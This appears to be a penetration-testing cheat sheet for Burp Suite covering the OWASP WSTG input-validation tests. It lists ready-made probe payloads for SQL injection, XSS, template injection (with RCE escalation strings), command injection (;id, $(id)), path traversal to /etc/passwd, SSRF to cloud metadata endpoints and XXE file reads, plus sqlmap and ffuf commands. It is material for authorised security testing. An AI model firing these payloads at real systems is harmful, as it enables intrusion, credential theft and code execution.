title: Burp Input — WSTG-INPV (19 tests): SQLi, XSS, SSRF, SSTI, XXE, CMDi
body: WSTG-INPV has 19 individual tests covering every injection category. The pattern: inventory every distinct input (including headers), probe each with one payload per injection type, look for any response difference, then go to the deep node for that vulnerability. Headers (User-Agent, Referer, X-Forwarded-For) are inputs too and are almost always unsanitized. The context clue in the response tells you which injection type you found.
cmd:
# ══ ⭐ INPUT VALIDATION — WSTG-INPV (19 tests) ═══════════════════════
# Map every distinct input first, THEN probe each one.
# An "input" is: URL param, body param, JSON field, HTTP header, cookie value,
# URL path segment, XML content, file upload name/content.

# ══ INPUT INVENTORY — before you test anything ════════════════════════
# In HTTP History after browsing: right-click any request -> Send to Repeater
# Count distinct parameter types. Headers ARE inputs too:
#   User-Agent, Referer, X-Forwarded-For, X-Real-IP, Origin, Cookie values
# These headers often unsanitized because "they come from the browser"

# ══ CONTEXT MAP — what injection type fits what clue ══════════════════
# | CLUE in response                | INJECTION TYPE  | DEEP NODE       |
# |----------------------------------+-----------------+-----------------|
# | SQL error / different behaviour | SQLi            | sqli_test       |
# | Input reflected verbatim        | XSS (reflected) | xss             |
# | Input stored + rendered later   | XSS (stored)    | xss             |
# | File content returned           | LFI/Path trav.  | lfi             |
# | Internal IPs / metadata         | SSRF            | ssrf            |
# | {{7*7}} returns 49              | SSTI            | ssti            |
# | XML input accepted              | XXE             | xxe             |
# | Command output in response      | CMDi            | cmd_injection   |
# | Different response size (blind) | Blind injection | sqli_blind      |
# | Deserialization error           | Deserializ.     | (research)      |
# | WS messages with injection      | WS injection    | burp_websocket  |
# | DOM sink receives your input    | DOM XSS         | burp_client     |

# ══ ONE-PAYLOAD PROBE PER TYPE (test ALL inputs with all probes) ═══════
# Change ONE input, send, look for ANY change in response.
# In Repeater: modify, Send, compare status + body length (bottom bar)
'           # SQLi: database error? changed response? longer load time?
"           # SQLi: same as above (quote character)
<script>alert(1)</script>   # XSS: reflected in response? encoded? stripped?
{{7*7}}     # SSTI: does 49 appear in the response? (Jinja2/Twig)
${7*7}      # SSTI: same but for EL/Freemarker (Java stacks)
;id         # CMDi: does 'uid=33(www-data)' appear? semicolon separator
|id         # CMDi: pipe separator (Windows: |whoami)
$(id)       # CMDi: subshell (bash)
`id`        # CMDi: backtick subshell
../../../etc/passwd  # LFI: file contents appear?
http://169.254.169.254/latest/meta-data/  # SSRF: EC2 metadata?
file:///etc/passwd                        # SSRF: local file read?
<?xml version="1.0"?><!DOCTYPE x [<!ENTITY t SYSTEM "file:///etc/passwd">]><x>&t;</x>  # XXE

# ══ PARAM MINER — find hidden inputs ════════════════════════════════
# Right-click request -> Extensions -> Param Miner -> Guess everything
# Finds: debug=true, admin=1, test=1, validated=true, cache=false, internal=true
# Also guesses: custom headers (X-Custom-IP-Authorization, X-Original-URL)
# Output: Extensions tab -> Param Miner -> Output

# ══ INTRUDER — fuzz a known input ════════════════════════════════════
# Ctrl+I -> Positions -> highlight value -> Add §
# Payload: fuzz vectors from SecLists
ffuf -u "http://$ip/search?q=FUZZ" \
  -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all -fc 200
# Or Intruder: Sniper + Simple list payload
# Sort by Length or Status -> odd-one-out = interesting behaviour

# ══ SQL INJECTION (WSTG-INPV-05) ════════════════════════════════════
# Detection: send ' in each input -> database error? changed response?
# Confirm: send 1=1 (true) vs 1=2 (false) -> different responses = injectable
# Quick: ' OR 1=1-- - (bypass login or get all rows)
# sqlmap via Burp (save request to file, use -r):
sqlmap -r request.txt --level 5 --risk 3 --dbs
# Full injection methodology -> sqli_test, sqli_blind, sqli_union nodes

# ══ XSS (WSTG-INPV-01/02/03) ════════════════════════════════════════
# Reflected: input in the URL/form -> appears in response body
# Stored: input saved -> rendered to other users
# DOM: JS reads location.hash/search -> writes to innerHTML (no server round-trip)
# Context determines payload:
#   In HTML: <script>alert(1)</script>
#   In attribute: " onmouseover=alert(1) x="
#   In href: javascript:alert(1)
#   In script context: ';alert(1)//
# Full context-aware XSS methodology -> xss node

# ══ SSRF (WSTG-INPV-19) ═════════════════════════════════════════════
# Any parameter that takes a URL or IP (webhook, file fetch, PDF render, avatar URL)
# Internal probe targets:
http://127.0.0.1:PORT/              # local services not exposed externally
http://169.254.169.254/latest/      # AWS EC2 metadata
http://metadata.google.internal/    # GCP metadata
http://169.254.169.254/metadata/v1/ # DigitalOcean/Azure metadata
file:///etc/passwd                  # local file read via file:// scheme
# Blind SSRF (no response visible): use Burp Collaborator or Interactsh
#   Replace URL with collaborator URL -> if DNS lookup arrives = blind SSRF confirmed
# Full exploitation -> ssrf node

# ══ SSTI (WSTG-INPV-18) ═════════════════════════════════════════════
# Jinja2/Python:  {{7*7}}=49  then: {{config}} for settings, {{''.__class__...}} for RCE
# Twig/PHP:       {{7*7}}=49  then: {{_self.env.registerUndefinedFilterCallback("exec")}}
# FreeMarker/Java:${7*7}=49   then: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Smarty/PHP:     {7*7}=49    then: {system('id')}
# Full identification + RCE -> ssti node

# ══ ERROR HANDLING (WSTG-ERRH-01/02) ════════════════════════════════
# Deliberately trigger errors: empty required fields, wrong data types, huge payloads
# Look for: stack traces, absolute file paths, DB table/column names, framework version
#   Rails red page: full backtrace + source code context -> exact file paths
#   PHP Fatal error: /var/www/html/app/db.php on line 42 -> path disclosure
#   Python/Werkzeug debug=True: interactive debugger -> code execution in browser
#   Java: java.sql.SQLException: ORA-01756 -> confirms Oracle DB -> adjust SQLi payloads
# Force a 500: send a JSON body to a form endpoint, or POST a file where a string expected

# ══ HEADERS AS INPUTS (often missed) ════════════════════════════════
# Test these headers with SQLi/XSS/SSTI probes — they're unsanitized constantly:
X-Forwarded-For: ' OR 1=1--      # often logged/displayed without sanitization
User-Agent: <script>alert(1)</script>   # stored XSS if logged to admin panel
Referer: {{7*7}}                 # SSTI if referer is used in a template
X-Custom-Header: PAYLOAD         # whatever the app reads for routing/display
# In Repeater: just add the header and your payload -> send -> check response
warn: HTTP headers are inputs that almost always get overlooked — User-Agent, Referer, and X-Forwarded-For are frequently logged to admin panels unsanitized (stored XSS) or used in SQL queries. Test them with the same probes you use on form fields. SSTI is subtle — {{7*7}} returning 49 in the response is the tell. If the app encodes your < and > but still processes {{}} you have SSTI even if XSS is blocked.
